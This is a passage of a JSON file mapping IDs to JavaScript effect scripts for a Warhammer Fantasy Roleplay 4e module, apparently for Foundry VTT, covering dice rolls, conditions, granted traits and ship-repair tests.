trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        items.push({name : trapping, type : \"trapping\", \"system.trappingType.value\" : \"clothingAccessories\"})\n        //ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","N9kA46ZQ9LiRjy6T":"return args.skill?.name == game.i18n.localize(\"NAME.Haggle\") || args.skill?.name == game.i18n.localize(\"NAME.Gossip\");","NDvNGATDM2xPFJK0":"brokenbone = await fromUuid(\"Compendium.wfrp4e-core.items.hCadFsTRvLN9faaY\")\nteeth = await fromUuid(\"Compendium.wfrp4e-core.items.fBcZhOBn8IpoVqQ1\")\ntongue = await fromUuid(\"Compendium.wfrp4e-core.items.rkJA1DlK51QuRlJy\")\nbrokenbone = brokenbone.toObject();\nteeth = teeth.toObject();\ntongue = tongue.toObject();\n\n\nlet roll = await new Roll(\"1d10\").roll();\nroll.toMessage(this.script.getChatData({flavor : \"Teeth Lost\"}))\n\nteeth.system.location.value = `${roll.total} ${teeth.system.location.value}`\nbrokenbone.system.location.value = \"Jaw\"\nthis.actor.createEmbeddedDocuments(\"Item\", [brokenbone, teeth, tongue])\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"vhard\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"unconscious\")\n}","NI3ZzIAlpQfVSjvf":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Fear value\", this.item.name);\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","NNytXz5XFPrEF6dw":"if (args.opposedTest.result.hitloc.value == this.item.system.location.key && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 1);\n}\n    ","NQSvFWhmBQAyx5Zz":"return args.item?.isRanged","Na7Nanl9YmxZlTo7":"return args.type != \"cast\" && args.type != \"channelling\")","NdquQqyuOkGCj8Uo":"let darkvision = await fromUuid(\"Compendium.wfrp4e-core.items.Item.JQa5DLnTs2SEzRrc\")\nlet fear = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet acutesense = await fromUuid(\"Compendium.wfrp4e-core.items.Item.9h82z72XGo9tfgQS\")\nfear = fear.toObject();\nfear.system.specification.value = 1;\nacutesense = acutesense.toObject();\nacutesense.name += \" (Smell)\";\nthis.actor.createEmbeddedDocuments(\"Item\", [darkvision, fear, acutesense], {fromEffect : this.effect.id})","NkqtQaLEGYst0PUO":"if (this.actor.has(\"Magic Resistance\", \"talent\")) \n    return\n\nlet item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.eowbsW6oHGSNJmxV\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","NnA4zpuO6iUXKhH7":"if ((args.opposedTest.attackerTest.item && args.opposedTest.attackerTest.item.isMelee) || (args.opposedTest.attackerTest.item && !args.opposedTest.attackerTest.item.name.includes(\"Ranged\")))\n{\n    let AP = parseInt(this.effect.sourceTest.result.SL)\n    args.modifiers.ap.value += AP;\n    args.modifiers.ap.magical += AP;\n    args.modifiers.ap.details.push(`${this.effect.name} (${AP})`)\n}","NnDq4miIPNEtZUWb":"args.test.result.critModifier = args.test.result.critModifier || 0;\nargs.test.result.critModifier += 20;\n\nif (args.test.result.critical)\n{\n    args.test.result.critical = `${game.i18n.localize(\"Critical\")} (+${args.test.result.critModifier})`\n}","NrVFrIXM8GnIbojv":"args.item.system.damage.value = `SB + ${this.actor.system.characteristics.fel.bonus}`;","O45vpR4jDbQQnmvJ":"let items = [];\n\nlet etiquette = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.sYbgpSnRqSZWgwFP\")).toObject();\netiquette.name += \" (Followers of Khorne)\";\n\nitems.push(etiquette);\n\nlet animosity = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.Q2MCUrG2HppMcvN0\")).toObject();\nanimosity.name = animosity.name.replace(\"(Target)\", \"(Followers of Slaanesh)\");\n\nitems.push(animosity);\n\nawait this.actor.createEmbeddedDocuments(\"Item\", items, {fromEffect : this.effect.id});\n","O7lXFZLrLdFaShGR":"args.options.catfall = true;","O9fc0hLHdkTgSuLg":"let bite = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet venom = await fromUuid(\"Compendium.wfrp4e-core.items.gFkRm9wS65qe18Xv\")\nlet biteData = bite.toObject();\nlet venomData = venom.toObject();\n\nbiteData.system.specification.value = 3 - this.actor.characteristics.s.bonus;\nvenomData.system.specification.value = \"Average\"\nthis.actor.createEmbeddedDocuments(\"Item\", [biteData, venomData], {fromEffect : this.effect.id})","OCFrGXAYfo9OYnhc":"return args.item?.system.magicMissile?.value || args.item?.system.attackType","OEy2lxvic37dRBEt":"let filters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"petty\"\n    }\n]\n\nlet petty = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 3, \"Choose 3 Petty Spells\")\n\n\nfilters = [\n    {\n        property : \"type\",\n        value : \"spell\"\n    },\n    {\n        property : \"system.lore.value\",\n        value : \"\"\n    }\n]\n\nlet arcane = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 3, \"Choose 3 Arcane Spells\")\n\nlet items = petty.concat(arcane).map(i => i.toObject())\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","OGX4BneaYAnV25TO":"let chatData = { whisper: ChatMessage.getWhisperRecipients(\"GM\") }\nlet message = \"\"\n\nlet wounds = foundry.utils.duplicate(this.actor.status.wounds)\nlet regenRoll = await new Roll(\"1d10\").roll();\nlet regen = regenRoll.total;\n\nif (wounds.value >= wounds.max)\n    return\n\nif (wounds.value > 0) \n{\n    wounds.value += regen\n    if (wounds.value > wounds.max)\n    {\n        wounds.value = wounds.max\n    }\n    message += `<b>${this.actor.name}</b> regains ${regen} Wounds.`\n\n    if (regen == 10)\n    {\n        message += `<br>Additionally, they regenerate a Critical Wound.`\n    }\n}\nelse if (regen >= 8) \n{\n    message += `<b>${this.actor.name}</b> rolled a ${regen} and regains 1 Wound.`\n    wounds.value += 1\n    if (regen == 10)\n    {\n        message += `<br>Additionally, they regenerate a Critical Wound.`\n    }\n}\nelse \n{\n    message += `<b>${this.actor.name}</b> Regenerate roll of ${regen} - No effect.`\n}\n\nawait this.actor.update({ \"system.status.wounds\": wounds })\nthis.script.scriptMessage(message, { whisper: ChatMessage.getWhisperRecipients(\"GM\") })","OJMgS8ZQv0j4tEFf":"return [\"ws\", \"bs\", \"s\", \"fel\", \"ag\", \"t\", \"dex\"].includes(args.characteristic)","OMAUX1fnHyIpplul":"return ![\"fel\", \"dex\"].includes(args.characteristic)","OXoqtpOdfkURZbuL":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.yRhhOlt18COq4e1q\")\nlet data = item.toObject()\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","Oa9FmLXRRZRpLrrq":"let test = await this.actor.setupTrait(this.item); \nawait test.roll();","OcQe0zfksf1DCJYe":"args.actor.system.characteristics.s.value += 30\nargs.actor.system.characteristics.t.value += 30\n\nargs.actor.system.characteristics.s.bonus += 3\nargs.actor.system.characteristics.t.bonus += 3\n\nif (args.actor.system.characteristics.s.value > 100)\n{\n   args.actor.system.characteristics.s.value = 100\n   args.actor.system.characteristics.s.bonus = 10\n}\n\nif (args.actor.system.characteristics.t.value > 100)\n{\n   args.actor.system.characteristics.t.value = 100\nargs.actor.system.characteristics.t.bonus = 10\n}","OeCgX3hIsfLfmGvC":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Perception\"))\nawait test.roll();\nif (test.succeeded)\n{\n    this.actor.removeCondition(\"surprised\");\n}","OeKeQAAcJhdI4Qky":"if (this.actor.hasCondition(\"stunned\") || this.actor.hasCondition(\"unconscious\"))\n{\n\tthis.script.scriptNotification(\"Disabled!\");\n\tawait this.effect.update({\"disabled\" : true})\n}","Ofn6vDbP3fZ4UlSc":"args.fields.modifier += -20;\n        ","OgSI0Z6SHjYuqKIz":"let blows = this.item.getFlag(\"wfrp4e\", \"blows\") || 0\nlet difficulties = Object.keys(game.wfrp4e.config.difficultyLabels)\n\nblows = Math.clamped(blows, 0, difficulties.length - 1)\nif (this.item.system.protects[args.opposedTest.result.hitloc.value])\n{\n    let difficulty = difficulties[blows];\n    this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields: {difficulty}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`}).then(async test => {\n        await test.roll();\n        if (test.failed)\n        {\n            this.script.scriptMessage(`${this.actor.name} must break from combat and flee until they pass a <strong>Challenging (+0) Willpower</strong> Test`);\n            this.item.setFlag(\"wfrp4e\", \"failedCool\", true);\n        }\n    })\n}","OicQSEVZBbqLtrcf":"let choice = await ItemDialog.create(this.actor.itemTypes.critical, (this.effect.sourceTest.result.overcast.usage.other.current || 1), \"Choose the Critical Wounds to heal (cannot reattach body parts)\")\n\nthis.script.scriptMessage(`Healed <strong>${choice.map(i => i.name).join(`, `)}</strong>`);\nthis.actor.deleteEmbeddedDocuments(\"Item\", choice.map(i => i.id))","OnkEe4ISru1hjJWP":"this.actor.flags.useless[this.item.system.location.key] = true;","Op88kMtimSEWlY2h":"if (this.item.system.quantity.value)\n{\n\tthis.item.system.reduceQuantity();\n\tlet actor = Array.from(game.user.targets)[0]?.actor || this.actor;\n\tactor.applyEffect({effectData : [this.item.effects.contents[1].convertToApplied()]})\n}\nelse\n{\n\tthis.script.scriptNotification(\"None left!\", \"error\")\n}","OqLKL0PiCvYH2QxW":"if (args.test.options.wallcrawler)\n{\n\tif (parseInt(args.test.result.SL) < 0 || args.test.failed)\n\t{\n\t\tif (parseInt(args.test.result.SL) < 0)\n\t\t{\n\t\t\targs.test.result.SL = \"+0\";\n\t\t\targs.test.result.description = game.i18n.localize(\"ROLL.MarginalSuccess\");\n\t\t}\n\t\targs.test.result.outcome = \"success\"\n        args.test.result.other.push(`<strong>${this.effect.name}</strong>: Minimum +0 SL`)\n\t}\n}","OqxeuZfZDfm9ax6h":"this.actor.system.status.addArmour(1, {locations : \"head\", source : this.effect})","OsLXutfXyQCAkhAf":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Sail';\nconst difficulty = 'average';\nconst target = 30;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","OvIELZLvnlN2H2uw":"args.update({light : {\n    \"dim\": 2,\n    \"bright\": 1,\n    \"alpha\": 0.5,\n    \"animation\": {\n        \"speed\": 4,\n        \"intensity\": 4,\n        \"type\": \"pulse\",\n    },\n    \"color\": \"#949bff\",\n}});","OxsBnnVI3Smpknpb":"if (this.actor.status.advantage.value && !this.actor.sameSideAs(this.effect.sourceActor))\n{\n    this.actor.modifyAdvantage(-1);\n    this.script.scriptNotification(`${this.actor.name} loses 1 Advantage`);\n}","Oz7pWF9mEc1pQypj":"let roll = await new Roll(\"1d10\").roll();\nroll.toMessage({flavor : this.effect.name, speaker : {alias : this.actor.prototypeToken.name}})\nthis.actor.addCondition(\"stunned\", roll.total)","P29tT1eMMdAw3CPF":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.3S4OYOZLauXctmev\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"hard\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n\tthis.actor.addCondition(\"unconscious\")\n}","PBW6IZtwawNHxB6y":"return args.options.dodge && this.actor.isMounted","PI1QNaKFeqood6d7":"if (args.attackerTest.weapon && args.defenderTest.weapon)\n{\n\n   let attackerReach = game.wfrp4e.config.reachNum[args.attackerTest.weapon.reach.value]\n   let defenderReach = game.wfrp4e.config.reachNum[args.defenderTest.weapon.reach.value]\n   \n   if (attackerReach == defenderReach)\n      attackerReach = attackerReach < 7 ? attackerReach + 1 : attackerReach\n\n   attackerReach = game.wfrp4e.utility.findKey(attackerReach, game.wfrp4e.config.reachNum)\n   defenderReach = game.wfrp4e.utility.findKey(defenderReach, game.wfrp4e.config.reachNum)\n\n  args.attackerTest.weapon.reach.value = attackerReach\n  args.defenderTest.weapon.reach.value = defenderReach\n}","PMISUsaEDBA7D3od":"// After consumption, the user gains the Magic Resistance 3 Creature Trait, \n// reducing the SL of any spell affecting it by 3. \n// This effect lasts for one hour.\nconst hasMagicResistance = this.actor.has(\"Magic Resistance\")\n\nif (hasMagicResistance === undefined) {\n  fromUuid(\"Compendium.wfrp4e-core.items.yrkI7ATjqLPDTFmZ\").then(trait => {\n    let traitItem = trait.toObject()\n    traitItem.system.specification.value = 2\n    this.actor.createEmbeddedDocuments(\"Item\", [traitItem], {fromEffect: this.effect.id})\n  })\n  this.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> has gained the Magic Resistance Trait. This effect lasts for one hour.</p>`, {whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })   \n}\n\nif (hasMagicResistance) {\n  // Multiple doses may be consumed at once, with each one adding an additional 1 to the Magic Resistance rating and increasing the duration by one hour.  \n  let msg = `<p><strong>${this.actor.prototypeToken.name}</strong> has enhanced their Magic Resistance by 1 to Rating ${parseInt(hasMagicResistance.system.specification.value)}. This effect lasts for one hour.</p>`\n\n  // Resist toxic effect\n  this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {\n    fields: {difficulty: \"challenging\"}\n  }).then(async test => {\n    await test.roll()\n\n    // If they fail ...\n    if (!test.succeeded) {\n      msg += `<p>However, they begin to ooze the thick, poisonous slime that coats every Dreadmaw.  They have gained 1 Poisoned Condition now and should continue to receive an additional @Condition[Poisoned] Condition at the end of each of the round.</p>\n      <p>If they are still alive at the end of 10 rounds, the effect ends and all Poisoned Conditions gained from ${this.effect.name} are removed.</p>`\n      this.actor.addCondition(\"poisoned\", 1)\n    }\n    this.script.scriptMessage(msg, {whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })\n  })\n}\n","PVjaKAHTKDA0rA9J":"let test = await this.actor.setupSkill(\"Dodge\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();","PdClojv7yNgQpOUc":"return args.skill?.name != game.i18n.localize(\"NAME.Endurance\");","PeZYj8b0vedyJj00":"// This script needs to be separate because equipTransfer is off on the other effect, and thus won't execute when added to an actor\n\nlet mainEffect = this.item.effects.contents[0];\nif (mainEffect.name.includes(\"(Lore)\"))\n{\n    let choice = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.magicLores, this.item.img), 1, \"Choose Lore\");\n    if (choice.length)\n    {\n        mainEffect.update({name : mainEffect.name.replace(\"Lore\", choice[0].name)})\n        this.item.update({name : this.item.name += ` (${choice[0].name})`})\n    }\n}\n\nthis.effect.delete();","Pg9C6nJX5QHIdqa9":"return !args.item?.system.attackType\n","Ph3TdQw1lGiFr049":"    if (!args.test.context.phantasmal && \n      (this.actor.isOpposing || args.test.context.defending) && \n      args.test.result.roll % 11 == 0 && \n      args.test.succeeded && \n      [\"Language (Magick)\", \"Dodge\"].includes(args.test.item?.name))\n    {\n         args.test.context.phantasmal = true; // Flag so items aren't readded if test is edited\n         let text = `<strong>${this.effect.name}</strong>: Adding Unstable and  Ward`\n         args.test.result.other.push(text)  \n        this.script.scriptNotification(text);\n     \n        let ward = await fromUuid(\"Compendium.wfrp4e-core.items.Bvd2aZ0gQUXHfCTh\")\n        let wardData = ward.toObject();\n        wardData.system.specification.value = 9;\n        \n        let unstable = await fromUuid(\"Compendium.wfrp4e-core.items.D0ImWEIMSDgElsnl\")\n        let unstableData = unstable.toObject();\n        this.actor.createEmbeddedDocuments(\"Item\", [wardData, unstableData], {fromEffect: this.effect.id})\n    }\n","PjRxGuUDKGmSmVDc":"fromUuid(\"Compendium.wfrp4e-core.items.EO05HX7jql0g605A\").then(item => {\n   item = item.toObject()\n   item.system.specification.value = this.actor.characteristics.ag.value\n   this.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})\n})","PmELrzD3RmF9qKkO":"if (this.item.system.specification.value == \"Size\")\n{\n    let choice = await ItemDialog.create(ItemDialog.objectToArray(game.wfrp4e.config.actorSizes, this.item.img), 1, \"Choose Size\");\n    if (choice[0])\n    {\n        this.item.updateSource({\"system.specification.value\" : choice[0].name})\n        this.effect.updateSource({name : this.effect.name + ` (${choice[0].name})`})\n    }\n}","Pn5fekTbkwlr61XU":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Engineer)';\nconst difficulty = 'easy';\nconst target = 10;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","PoNnT5EqvLj2r5yf":"return args.skill?.name != game.i18n.localize(\"NAME.OutdoorSurvival\") && args.skill?.name != game.i18n.localize(\"NAME.Track\");","PsO7aTdELJt35eHP":"let morale = await new Roll(\"-1d10\").roll();\nlet mood = await new Roll(\"-2d10\").roll();\n\nmorale.toMessage(this.script.getChatData({flavor : \"Morale\"}));\nmood.toMessage(this.script.getChatData({flavor : \"Manann's Mood\"}));\n\nawait this.actor.system.status.morale.addEntry(\"Albatross Died\", morale.total)\nawait this.actor.system.status.mood.addEntry(\"Albatross Died\", mood.total);\n\nthis.effect.delete();","PwqTmw7rsG8hzqCS":"if (args.test.result.critical && args.test.result.roll % 10 == 0) \n{\n    game.wfrp4e.tables.findTable(\"knuckleduster-diseases\").roll().then(roll => {\n      let results = roll.results[0]\n\n      this.script.scriptMessage(`<strong>${this.actor.name}</strong> contracts @UUID[Compendium.${results.documentCollection}.${results.documentId}]{${results.text}}`, {blind : true, whisper: ChatMessage.getWhisperRecipients(\"GM\") })\n    })\n\n  }\n\n","Q1trEhtqjIiDvFPF":"args.prefillModifiers.modifier -= 10 * foundry.utils.getProperty(this.effect, 'flags.wfrp4e.value')","Q4EQgP4gZR8TTm7S":"let penalty = 0\nif (args.item?.system.attackType)\n{\n   penalty -= 30\n}\nif (args.actor.has(\"Second Sight\", \"talent\"))\n    penalty += 10\n\nargs.prefillModifiers.modifier += penalty","Q5gh5Y9dCdclcwsD":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Channelling\")) && args.skill?.name != `${game.i18n.localize(\"NAME.Language\")} (${game.i18n.localize(\"SPEC.Magick\")})`","Q68WiUWY7GxiXBbT":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.9GNpAqgsKzxZKJpp\")\nlet data = item.toObject();\ndata.system.specification.value = \"When Alone\";\ndata.effects[0].disabled = true;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","Q7eULXQ9AfDRmUGO":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'difficult';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","Q9EmlWmuDac83cJw":"return args.skill?.name == game.i18n.localize(\"NAME.Climb\")  || args.skill?.name?.includes(game.i18n.localize(\"NAME.Stealth\"));","QF8LanKNoAlTkQG0":"this.actor.system.status.encumbrance.max += 2","QHQ7XmFOjT9wXgw1":"if (args.actorsystem.details.move.oars.value > 0)\n  args.actor.system.details.move.oars.value -= 1;\n\nargs.actor.system.details.man -= 2;","QKTA2TqZ77pvHWSJ":"    this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 0,\n      \"bright\": 0,\n      \"alpha\": 0.5,\n      \"animation\": {\n          \"type\": \"\",\n      },\n      \"color\": \"#000000\",\n  }}));","QKjR6P1WEHXf4K77":"args.fields.slBonus -= 2\n","QNxmImpLTou6WdMQ":"let test = args.test\nif (test.result.minormis || test.result.majormis || test.result.catastrophicmis)\n         test.result.other.push(\"Can make a <b>Difficult (-10) Willpower</b> Test to prevent the Miscast\")","QPVVDPcJ4Xi5FmQl":"if(this.actor.hasCondition(\"fatigued\") && args.opposedTest.result.hitloc.value == \"head\" && (args.opposedTest.attackerTest.result.critical || args.actor.status.wounds.value - args.totalWoundLoss < 0))\n{\n    let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), { fields: { difficulty: \"average\" }, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\n    await test.roll();\n    if (test.failed)\n    {\n        this.actor.addCondition(\"unconscious\")\n    }\n}","QQ2gHThZHdO4yLLX":"return args.skill?.name == game.i18n.localize(\"NAME.Swim\");","QQPiREc50HT5W2Tr":"if (args.item.type == \"weapon\" && args.item.weaponGroup.value == \"brawling\")\n    args.item.damage.value += \" + 1\"","QRSACifDrvojIXHB":"if (!this.actor.effects.find(e => e.isCondition))\n{\n\treturn this.script.scriptNotification(\"No Conditions on this Actor\")\n}\n\nlet choice = await ItemDialog.create(this.actor.effects.filter(i => i.isCondition), 1, \"Choose a Condition\")\n\nif (choice[0])\n{\n\tthis.actor.removeCondition(choice[0].conditionId)\n}\n","QaGNsqKm2Nf0zGVm":"return [\"t\", \"int\", \"wp\", \"fel\"].includes(args.characteristic)","QbIYnshWeP1U8SUy":"args.applyAP = false;\nargs.applyTB = false;","QfTBRGXVfwQSghmd":"fromUuid(this.effect.origin).then(caster => {\n   if (caster) {\n      if (actor.items.find(it => it.name == game.i18n.localize(\"Bestial\"))) {\n         let healed = caster.characteristics.wp.bonus\n         let wounds = foundry.utils.duplicate(args.actor.status.wounds)\n         wounds.value += healed\n\n         if (wounds.value > wounds.max)\n            wounds.value = wounds.max\n\n         args.actor.update({ \"system.status.wounds\": wounds })\n         ChatMessage.create({ content: `${this.actor.prototypeToken.name} regains ${healed} Wounds`, speaker: { alias: this.effect.name } })\n      } else {\n         ui.notifications.warn(\"Target actor has no Bestial trait\")\n      }\n   }\n})\n\n","Qgn92fZyc3Psn8QJ":"if (args.test.options.useOnesAttractive && (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target))\n{\n\nlet SL = Math.floor(args.test.target / 10) - Math.floor(args.test.result.roll / 10)\nlet ones = Number(args.test.result.roll.toString().split(\"\").pop())\n\nif (ones > SL)\n\targs.test.data.result.SL = \"+\" + (ones + args.test.successBonus + args.test.slBonus)\n   args.test.result.other.push(`<b>${this.effect.name}</b>: Used unit dice as SL`)\n}","Qk7t2l5ep9RDVpgE":"args.options.diceman= true;","QoEOxRruQXYrZrv3":"let filters = [\n    {\n        property : \"type\",\n        value : \"skill\"\n    },\n    {\n        property : \"name\",\n        value : /Melee/gm,\n        regex: true\n    }\n]\n\nlet items = await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 2, \"Choose 2 Skills to add +20\")\nitems = items.map(i => i.toObject())\nitems.forEach(i => i.system.advances.value = 20)\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);","QqkE7rlqhkeRohFD":"return !([\"cast\", \"channelling\"].includes(args.type) && this.actor.hasCondition(\"fatigued\"))","QqybHxNCzPEzG1Qh":"return args.fields.dualWielding || args.options.dualWieldOffhand","QwHoqu2oO8QO8Mad":"let content = `<b>${this.effect.name}</b>: All targets engaged with <b>${this.actor.prototypeToken.name}</b> take [[/r 1d10]] Damage, modified by TB and AP.`\n\nthis.script.scriptMessage(content)","R32U01LBjBrK1pns":"        const templateMap = {\n            'P2e7Yx98bK3u110a' : \"\",\n            'iuMp3KLaMT2WCmie' : \"Xp4r2KUhqfjak8zq\", \n            'RBuYcT5tppwcmnC5' : \"wYN19h3WVF1yOVq2\", \n            'vcGpNwNbhvfzVveQ' : \"ac5ClOuaYtzOYyWp\", \n            'jmhKZy0w9TzkEK9c' : \"IS3LTdTuay6uRHUq\", \n            '9Byj6k7SmdTYis2V' : \"LjMlx99gBGeRJUQu\", \n            'laJwc2l9tzJPgaaJ' : \"x5wpMprsObuqMCYg\",\n        }\n        let template = (await game.wfrp4e.tables.rollTable(\"hireling-templates\", {hideDSN: true})).object;\n        let physicalQuirk = (await game.wfrp4e.tables.rollTable(\"physical-quirks\", {hideDSN: true})).text;\n        let workEthic = (await game.wfrp4e.tables.rollTable(\"work-ethic\", {hideDSN: true})).text;\n        let personalityQuirk = (await game.wfrp4e.tables.rollTable(\"personality-quirks\", {hideDSN: true})).text;\n\n\n        let templateItem = await game.wfrp4e.utility.findItemId(templateMap[template._id]);\n\n        let bio = \n        `\n        <p><strong>Template</strong>: ${template.text}</p>\n        <p><strong>Phsyical Quirk</strong>: ${physicalQuirk}</p>\n        <p><strong>Work Ethic</strong>: ${workEthic}</p>\n        <p><strong>Personality Quirk</strong>: ${personalityQuirk}</p>\n        `\n        \n        this.script.scriptMessage(bio, {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n\n        await this.actor.update({\"system.details.gmnotes.value\" : bio})\n\n        if (templateItem)\n        {\n            this.actor.createEmbeddedDocuments(\"Item\", [templateItem.toObject()])\n        }","R5dOZWFxE2n6tooX":"return this.item.system.usesLocation(args.weapon)","R6SnyF3y4Vsq6oga":"let lore = this.effect.name.split(\"(\")[1].split(\")\")[0].toLowerCase();\n\n// If channelling corresponding lore\nif (args.type == \"channelling\" && args.spell.system.lore.value == lore)\n    args.prefillModifiers.slBonus  += 1\n// If channelling or casting different lore\nelse if (args.spell.system.lore.value != lore && args.spell.system.lore.value != \"petty\")\n    args.prefillModifiers.slBonus  -= 1","R8FBHZaaARA3z9pB":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'hard';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: 